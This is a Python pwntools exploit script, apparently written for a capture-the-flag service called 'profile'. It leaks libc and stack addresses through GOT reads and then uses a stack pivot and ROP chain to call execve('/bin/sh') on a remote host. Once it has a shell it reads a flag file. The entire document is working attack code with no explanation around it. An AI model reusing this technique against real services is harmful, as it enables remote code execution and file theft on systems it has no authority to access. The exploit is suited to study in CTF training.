#!/usr/bin/env python

from pwn import *

setbuf_got = 0x0804B02C
buf = 0x0804B088
exit_got = 0x0804B024
malloc_got = 0x0804B018
malloc_extend = 0x0804B0A8
strncat_got = 0x0804B03C
puts_got = 0x0804B01C
read_got = 0x0804B00C

def create(p,nlen,name,age):
	p.recvuntil(">")
	p.sendline("1")
	p.recvuntil("Input your name len:\n")
	p.sendline(nlen)
	p.recvuntil("Input your name:\n")
	p.send(name)
	p.recvuntil("Input your age:\n")
	p.sendline(age)

def print_profile(p,):
	p.recvuntil(">")
	p.sendline("2")
	p.recvuntil("Your name: ")
	addr = u32(p.recv(4))
	p.recvuntil("\n")
	p.recvuntil("Your age: ")
	#addr = u32(p.recv(4))
	return addr

def update(p,nlen,name,age,flag = 0):
	p.recvuntil(">")
	p.sendline("3")
	p.recvuntil("Input your new namelen:\n")
	p.sendline(str(nlen))
	p.recvuntil("Input your name:\n")
	if flag == 0:
		p.sendline(name)
	p.recvuntil("Input your age:\n")
	p.sendline(age)

def exchange(p,a1,a2):
	p.recvuntil(">")
	p.sendline("4")
	p.recvuntil("Person 1: ")
	p.send(a1)
	p.recvuntil("Person 2: ")
	#gdb.attach(p)
	p.send(a2)

def get_flag(host, port):
    try:
        #p = process("./profile")
        p = remote(host, port, timeout=3)
        create(p, str(8),p32(read_got)*2,str(5))
        update(p, 1,p32(read_got)[0],str(5))
        update(p, 8,"1"*8,str(5))
        read = print_profile(p)
        print "read: " + hex(read)

        libc_base = read - 0x000DAC10
        binsh = libc_base + 0x0015FA8F
        execve = libc_base + 0x000B5920
        ext = libc_base + 0x00031180
        environ = libc_base + 0x001AADE0

        update(p, 8,p32(environ)*2,str(5))
        update(p, 1,p32(environ)[0],str(5))
        update(p, 8,"1"*8,str(5))
        stack = print_profile(p)
        print "stack: " + hex(stack)

        update(p, 1024, "c"*512 + 'A'*4 + p32(0x08048C7E) + 'B'*8 + p32(execve) + p32(ext)+p32(binsh) + "\x00"*8 + "\n","9")

        update(p, 1,"A","2")
        heap = print_profile(p)
        print "heap: " + hex(heap - 0x41 + 0x8)
        exchange(p, p32(stack - 0xf0), p32(heap - 0x41 + 0x8 + 0x200))
        p.sendline('5')
        p.recvuntil('bye\n')
        p.sendline("cat /opt/flag/flag.txt")
        flag = p.recv(192)
        p.close()
        print flag
        return flag.strip("\n ")
    except Exception as e:
        print e
        return ""

def main():
    try:
	    get_flag("192.168.30.36",12345)
    except Exception as e:
        print e

if __name__ == '__main__':
    main()

